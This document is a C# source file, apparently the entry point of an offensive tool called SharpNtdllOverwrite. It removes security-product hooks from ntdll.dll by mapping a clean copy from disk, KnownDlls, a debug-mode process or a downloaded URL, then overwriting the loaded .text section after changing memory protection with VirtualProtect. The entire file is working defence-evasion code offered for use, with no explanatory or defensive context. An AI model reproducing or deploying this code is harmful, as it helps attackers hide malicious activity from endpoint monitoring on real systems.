using System;
using static SharpNtdllOverwrite.FromDebugProc;
using static SharpNtdllOverwrite.FromDisk;
using static SharpNtdllOverwrite.FromKnownDlls;
using static SharpNtdllOverwrite.FromUrl;
using static SharpNtdllOverwrite.LocalProc;
using static SharpNtdllOverwrite.Win32;


namespace SharpNtdllOverwrite
{
    internal class Program
    {
        // Overwrite hooked ntdll .text section with a clean version
        static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
        {
            // VirtualProtect to PAGE_EXECUTE_WRITECOPY
            uint dwOldProtection;
            bool vp1_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
            if (!vp1_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)");
                Environment.Exit(0);
            }

            // Copy from one address to the other
            unsafe
            {
                Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
            }

            // VirtualProtect back to PAGE_EXECUTE_READ
            bool vp2_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, dwOldProtection, out dwOldProtection);
            if (!vp2_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (dwOldProtection)");
                Environment.Exit(0);
            }
        }


        static void Main(string[] args)
        {
            string option = "default";
            if (args.Length >= 1)
            {
                option = args[0];
            }

            // Clean DLL
            IntPtr unhookedNtdllTxt = IntPtr.Zero;
            switch (option)
            {
                // From file in disk
                case "disk":
                    string ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
                    if (args.Length >= 2)
                    {
                        ntdll_path = args[1];
                    }
                    IntPtr unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
                    Console.WriteLine("[+] Mapped Ntdll Handle [Disk]: \t\t0x" + unhookedNtdllHandle.ToString("X"));
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
                    Console.WriteLine("[+] Mapped Ntdll .Text Section [Disk]: \t\t0x" + unhookedNtdllTxt.ToString("X"));
                    break;

                // From KnownDlls folder
                case "knowndlls":
                    unhookedNtdllHandle = MapNtdllFromKnownDlls();
                    Console.WriteLine("[+] Mapped Ntdll Handle [KnownDlls]: \t\t0x" + unhookedNtdllHandle.ToString("X"));
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
                    Console.WriteLine("[+] Mapped Ntdll .Text Section [KnownDlls]: \t0x" + unhookedNtdllTxt.ToString("X"));
                    break;

                // From a process created in DEBUG mode
                case "debugproc":
                    string process_path = "c:\\windows\\system32\\calc.exe";
                    if (args.Length >= 2)
                    {
                        process_path = args[1];
                    }
                    unhookedNtdllTxt = GetNtdllFromDebugProc(process_path);
                    Console.WriteLine("[+] Mapped Ntdll .Text Section [DebugProc]: \t0x" + unhookedNtdllTxt.ToString("X"));
                    break;

                // From a process created in DEBUG mode
                case "download":
                    string dll_url = "http://127.0.0.1:80/ntdll.dll";
                    if (args.Length >= 2)
                    {
                        dll_url = args[1];
                    }
                    unhookedNtdllHandle = GetNtdllFromFromUrl(dll_url);
                    Console.WriteLine("[+] Mapped Ntdll Handle [Download]: \t\t0x" + unhookedNtdllHandle.ToString("X"));
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_fromdiskdll;
                    Console.WriteLine("[+] Mapped Ntdll .Text Section [Download]: \t0x" + unhookedNtdllTxt.ToString("X"));
                    break;
                // Default: Show usage message
                default:
                    Console.WriteLine("[-] One input parameter is necessary: \"disk\", \"knowndlls\", \"debugproc\" or \"download\".\n[-] Options \"disk\", \"debugproc\" and \"download\" accept a second parameter or use their default value.\n\n[*] From disk:\n[*] SharpNtdllOverwrite.exe disk [ c:\\windows\\system32\\ntdll.dll ]\n[*] From KnownDlls folder:\n[*] SharpNtdllOverwrite.exe knowndlls\n[*] From a process created in DEBUG mode:\n[*] SharpNtdllOverwrite.exe debugproc [ c:\\windows\\system32\\calc.exe ]\n[*] From a url:\n[*] SharpNtdllOverwrite.exe url [ http://127.0.0.1:80/ntdll.dll ]");
                    Environment.Exit(0);
                    break;
            }

            // Local DLL
            IntPtr localNtdllHandle = CustomGetModuleHandle("ntdll.dll");
            Console.WriteLine("[+] Local Ntdll Handle: \t\t\t0x" + localNtdllHandle.ToString("X"));
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;
            Console.WriteLine("[+] Local Ntdll Text Section: \t\t\t0x" + localNtdllTxt.ToString("X"));

            // Replace DLL
            Console.WriteLine("[+] Copying " + localNtdllTxtSize + " bytes from 0x" + unhookedNtdllTxt.ToString("X") + " to 0x" + localNtdllTxt.ToString("X"));
            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize);
        }
    }
}
